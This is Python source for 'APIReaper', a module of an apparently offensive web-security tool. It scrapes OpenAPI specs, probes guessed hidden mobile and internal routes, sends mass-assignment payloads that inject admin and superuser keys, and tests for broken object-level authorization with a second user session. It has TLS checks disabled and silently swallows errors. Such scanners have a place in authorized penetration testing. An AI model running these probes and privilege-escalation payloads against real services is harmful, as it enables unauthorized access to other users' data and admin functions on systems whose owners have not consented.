import json
import asyncio
import re
from rich.console import Console
from aura.core import state
from urllib.parse import urljoin, urlparse

from aura.ui.formatter import console

class APIReaper:
    """
    v25.0 OMEGA Professional: API Deconstruction & Exploitation.
    Ingests Swagger/OpenAPI specs to map the entire backend architecture.
    """
    def __init__(self, target: str = None, session=None, discovered_endpoints: list = None):
        self.target = target
        import httpx
        self.session = session or httpx.AsyncClient(verify=False)
        self.endpoints = []
        self.discovered_endpoints = discovered_endpoints or []

    async def run(self):
        """Discovers and parses Swagger/OpenAPI specifications, then audits them."""
        all_findings = []
        if not self.target: return all_findings
        
        common_paths = ["/swagger.json", "/api/swagger.json", "/openapi.yaml", "/api-docs", "/v1/api-docs", "/v2/api-docs"]
        
        for p in common_paths:
            url = urljoin(self.target, p)
            await self.ingest_spec(url)
            if self.endpoints:
                break
                
        # Fallback: if no Swagger, build mock endpoints from discovered frontend paths
        if not self.endpoints and self.discovered_endpoints:
            console.print(f"[yellow][!] No Swagger found. Building API map from {len(self.discovered_endpoints)} Frontend Deconstructor paths...[/yellow]")
            for path in self.discovered_endpoints:
                self.endpoints.append({
                    "path": path,
                    "method": "POST",  # Assume POST for mutation tests
                    "params": {"id": 1, "user_id": 1, "test": "aura"},
                    "tags": ["frontend_extracted"]
                })
                self.endpoints.append({
                    "path": path,
                    "method": "GET",
                    "params": {"id": 1},
                    "tags": ["frontend_extracted"]
                })

        if self.endpoints:
            # v38.0: Mobile API Ghost Hunter - Extrapolate hidden backends
            await self._extrapolate_mobile_routes()
            
            findings = await self.audit_all()
            all_findings.extend(findings)
            
        return all_findings

    async def _extrapolate_mobile_routes(self):
        """
        [MOBILE GHOST HUNTER] v38.0: Performs autonomous route guessing for hidden backends.
        If /api/v1/user is found, it guesses /api/mobile/v1/user, /internal/v1/user, etc.
        """
        if not self.endpoints: return
        
        console.print(f"[bold purple][👻 MOBILE GHOST] Extrapolating hidden backends from {len(self.endpoints)} base routes...[/bold purple]")
        extrapolated = []
        
        # Mobile/Internal prefixes to test
        mobile_patterns = ["/mobile", "/m", "/api/mobile", "/api/m", "/internal", "/api/internal", "/v1/mobile", "/v2/mobile"]
        
        # Limit to 10 base routes to avoid explosion
        base_routes = self.endpoints[:10] 
        
        for ep in base_routes:
            # Fix: Ensure ep is a dictionary and has a 'path' key
            if not isinstance(ep, dict) or "path" not in ep:
                continue
                
            path = ep["path"]
            # Try to identify the 'api' part or the root
            import urllib.parse
            parsed = urllib.parse.urlparse(path)
            path_str = parsed.path
            base_authority = f"{parsed.scheme}://{parsed.netloc}" if parsed.scheme else self.target
            
            for pattern in mobile_patterns:
                # 1. Prefix extrapolation: /api/v1/user -> /api/mobile/v1/user
                if "/api/" in path_str:
                    new_path = path_str.replace("/api/", f"{pattern}/")
                else:
                    new_path = f"{pattern}{path_str}"
                
                # Ensure we don't have double slashes if pattern and path_str both have them
                new_path = new_path.replace("//", "/")
                new_url = urljoin(base_authority, new_path)
                
                # Verify if the extrapolated route exists
                try:
                    resp = await self.session.request("GET", new_url, timeout=5)
                    if resp and resp.status_code in [200, 401, 403, 405]:
                        console.print(f"[bold green][✓] GHOST BACKEND DISCOVERED: {new_url} ({resp.status_code})[/bold green]")
                        extrapolated.append({
                            "path": new_url,
                            "method": "GET",
                            "params": ep.get("params", {}),
                            "tags": ["mobile_ghost_extrapolated"]
                        })
                except: pass
        
        self.endpoints.extend(extrapolated)
        console.print(f"[bold green][✓] Extrapolation Complete: Added {len(extrapolated)} ghost routes to audit queue.[/bold green]")

    async def ingest_spec(self, url: str):
        """Downloads and parses swagger.json or openapi.yaml."""
        console.print(f"[bold cyan][⚔️ API REAPER] Ingesting API Specification from {url}...[/bold cyan]")
        try:
            resp = await self.session.get(url)
            if resp and resp.status_code == 200:
                spec = resp.json()
                await self._parse_spec(spec, url)
        except Exception as e:
            console.print(f"[dim red][!] Spec ingestion failed: {e}[/dim red]")

    async def _parse_spec(self, spec: dict, base_url: str):
        """Maps endpoints, methods, and parameters from the spec."""
        paths = spec.get("paths", {})
        server_url = spec.get("servers", [{}])[0].get("url", "/")
        
        for path, methods in paths.items():
            full_path = urljoin(base_url, path)
            for method, details in methods.items():
                if method.lower() not in ["get", "post", "put", "patch", "delete"]:
                    continue
                
                endpoint = {
                    "path": full_path,
                    "method": method.upper(),
                    "params": self._extract_params(details),
                    "tags": details.get("tags", [])
                }
                self.endpoints.append(endpoint)
        
        console.print(f"[bold green][✓] API Mapping Complete: {len(self.endpoints)} endpoints identified.[/bold green]")

    def _extract_params(self, details: dict) -> dict:
        params = {}
        # Parse standard parameters
        for p in details.get("parameters", []):
            name = p.get("name")
            p_type = p.get("schema", {}).get("type", "string")
            params[name] = self._get_default_val(p_type)
            
        # Parse requestBody for POST/PUT
        content = details.get("requestBody", {}).get("content", {})
        json_content = content.get("application/json", {}).get("schema", {})
        if json_content:
            props = json_content.get("properties", {})
            for name, p_details in props.items():
                params[name] = self._get_default_val(p_details.get("type", "string"))
                
        return params

    def _get_default_val(self, p_type: str):
        if p_type == "integer": return 123
        if p_type == "boolean": return False
        return "aura_test"

    async def audit_all(self, session_b=None):
        """v25.0 OMEGA: Comprehensive API Security Audit."""
        all_findings = []
        console.print(f"[bold cyan][⚔️ API REAPER] Launching Offensive Audit on {len(self.endpoints)} routes...[/bold cyan]")
        
        for ep in self.endpoints:
            # 1. Mass Assignment (POST/PUT/PATCH)
            if ep["method"] in ["POST", "PUT", "PATCH"]:
                res = await self._test_mass_assignment(ep)
                if res: all_findings.append(res)
            
            # 2. BOLA/IDOR Audit (Requires secondary session)
            if session_b:
                res = await self._test_bola(ep, session_b)
                if res: all_findings.append(res)
                
        return all_findings

    async def _test_mass_assignment(self, ep: dict):
        """
        [OMEGA PHASE 4] Recursive Mass Assignment.
        Injects nested administrative JSON objects to bypass shallow validation.
        """
        # Professional-tier keys and recursive nested objects
        privileged_keys = {
            "is_admin": True, "isAdmin": 1, "role": "superuser", 
            "permissions": ["root", "*"], "access_level": 999,
            # Recursive nesting to bypass shallow filters
            "user": {"is_admin": True, "role": "admin", "permissions": {"level": 10, "all": True}},
            "config": {"can_edit": True, "super_user": True}
        }
        payload = {**ep["params"], **privileged_keys}
        try:
            resp = await self.session.request(ep["method"], ep["path"], json=payload)
            if resp and resp.status_code in [200, 201]:
                # Check if the response reflects the escalation or reveals new data
                if any(k in resp.text for k in privileged_keys.keys()):
                    console.print(f"[bold red][🔥 MASS ASSIGNMENT] Confirmed on {ep['path']}[/bold red]")
                    return {
                        "type": "Mass Assignment (Authorization Bypass)",
                        "severity": "CRITICAL", "url": ep["path"],
                        "content": f"Server accepted administrative keys in {ep['method']} request body."
                    }
        except: pass
        return None

    async def _test_bola(self, ep: dict, session_b):
        """Dual-Credential IDOR: Can User B access User A's object?"""
        id_params = [k for k in ep["params"].keys() if any(x in k.lower() for x in ["id", "uuid", "uid"])]
        if not id_params: return None

        for p_name in id_params:
            original_val = ep["params"][p_name]
            try:
                # User B attempts to access User A's ID
                url = ep["path"]
                headers = {"Content-Type": "application/json"}
                
                if ep["method"] == "GET":
                    resp = await session_b.get(url, params={p_name: original_val})
                else:
                    resp = await session_b.request(ep["method"], url, json={p_name: original_val})

                if resp and resp.status_code == 200:
                    # Deterministic BOLA Check: Compare with a 'Failed' baseline
                    # If we change the ID to something random and get 404/403, then 200 is a confirmed BOLA.
                    random_id = "9999999" if isinstance(original_val, int) else "00000000-0000-0000-0000-000000000000"
                    if ep["method"] == "GET":
                        baseline = await session_b.get(url, params={p_name: random_id})
                    else:
                        baseline = await session_b.request(ep["method"], url, json={p_name: random_id})
                    
                    if baseline and baseline.status_code in [403, 404]:
                        console.print(f"[bold red][⚓ BOLA CONFIRMED] {ep['path']} | Param: {p_name}[/bold red]")
                        return {
                            "type": "Broken Object Level Authorization (BOLA)",
                            "severity": "CRITICAL", "url": ep["path"],
                            "content": f"User B successfully accessed User A's resource using id={original_val} while baseline id={random_id} was blocked."
                        }
            except: pass
        return None
